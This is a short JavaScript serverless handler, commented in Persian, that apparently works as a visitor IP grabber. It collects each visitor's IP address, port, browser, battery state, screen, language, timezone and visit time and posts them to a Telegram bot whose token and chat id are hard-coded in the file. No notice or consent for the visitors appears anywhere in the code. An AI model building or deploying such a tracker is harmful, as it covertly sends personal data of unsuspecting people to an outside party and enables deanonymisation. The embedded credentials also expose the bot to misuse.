export default async function handler(req, res) {
  // آی‌پی و پورت واقعی کاربر
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
  const port = req.socket.remotePort;

  // توکن و chat_id مستقیم جاسازی شده
  const token = "7961668268:AAEGMLMj5TojYl3giXl_C8S0O2zH3Q8IeEU";
  const chatId = "7198165253";

  // داده‌های اضافی از body (مرورگر)
  let body = {};
  try {
    body = req.body || {};
  } catch (e) {
    console.error("Body parse error:", e);
  }

  const message = `
Visitor IP: ${ip}
Port: ${port}
Browser: ${req.headers["user-agent"]}
Battery: ${body.batteryLevel || "Unknown"} (Charging: ${body.charging})
Screen: ${body.screen || "Unknown"}
Language: ${body.language || "Unknown"}
Timezone: ${body.timezone || "Unknown"}
Visit Time: ${body.visitTime || "Unknown"}
`;

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });
    res.status(200).send("Data sent to Telegram!");
  } catch (err) {
    console.error("Telegram error:", err);
    res.status(500).send("Error sending data");
  }
}
